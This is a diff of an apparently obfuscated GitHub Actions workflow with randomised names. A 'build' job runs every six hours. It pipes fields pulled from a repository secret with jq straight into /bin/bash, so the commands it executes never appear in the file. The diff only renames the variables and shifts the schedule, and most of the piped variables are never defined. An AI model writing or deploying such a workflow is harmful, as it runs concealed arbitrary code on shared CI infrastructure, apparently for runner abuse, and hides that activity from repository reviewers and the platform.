@@ -1,26 +1,25 @@
 name: guyindu0918
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 2/6 * * *'
+    - cron: '4 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: guyindu0918
         env:
-          cewo27616: ${{ secrets.cewo27616 }}
+          ry50519: ${{ secrets.ry50519 }}
         run: |
-          echo $cewo27616 | jq -r .nwtax4291 | /bin/bash
-          echo $jqk3 | jq -r .wf182 | /bin/bash
-          echo $sd47 | jq -r .rcc056 | /bin/bash
-          echo $ie910 | jq -r .bxapu8640 | /bin/bash
-          echo $xgzbk56 | jq -r .kky885 | /bin/bash
-          echo $zm7366 | jq -r .e86 | /bin/bash
-          echo $x721 | jq -r .nsn96 | /bin/bash
-          echo $la29076 | jq -r .g2 | /bin/bash
-          echo $xh7 | jq -r .eptv454 | /bin/bash
-          echo $gbor349 | jq -r .mypok20 | /bin/bash
+          echo $ry50519 | jq -r .m88868 | /bin/bash
+          echo $vrviw6 | jq -r .zgl8 | /bin/bash
+          echo $luiu22693 | jq -r .xairq4831 | /bin/bash
+          echo $npbl9 | jq -r .q2 | /bin/bash
+          echo $z37 | jq -r .u44898 | /bin/bash
+          echo $hgz1439 | jq -r .wke4148 | /bin/bash
+          echo $pxckr255 | jq -r .br4047 | /bin/bash
 
